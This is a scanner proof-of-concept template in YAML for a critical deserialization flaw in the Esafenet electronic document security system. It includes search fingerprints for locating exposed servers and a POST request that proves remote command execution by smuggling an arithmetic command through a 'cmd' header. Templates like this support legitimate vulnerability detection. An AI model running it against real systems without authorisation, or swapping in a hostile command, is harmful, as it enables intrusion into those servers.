id: poc-yaml-yisaitong-esafenet-offlineapplicationservice2-unserialize
info:
  name: 亿赛通电子文档安全管理系统 OfflineApplicationService2反序列化漏洞
  severity: critical
  tags:
  - 反序列化
  finger: 亿赛通电子文档安全管理系统
  fofa: body="CDGServer3" || title="电子文档安全管理系统" || cert="esafenet" || body="/help/getEditionInfo.jsp"
firstRequest:
  method: GET
  path: /
  expression: 'status_code == 200 &&

    (contains(gbk_decode(body),"电子文档安全管理系统") || contains(body,"电子文档安全管理系统"))

    '
variables:
  t1: random_int(111000,999000)
  t2: random_int(10,100)
  t3: t1 - t2
  command: '"cmd.exe /c set /a "+ str(t1) +" - "+ str(t2)

    "expr "+ str(t1) + " - " + str(t2)

    '
requests:
- method: POST
  path: /CDGServer3/CheckClientServelt?command=GETSYSTEMINFO
  headers:
    cmd: '{{.command}}'
  data: 
  expression: 'status_code == 200 &&

    body == t3

    '
transport: http
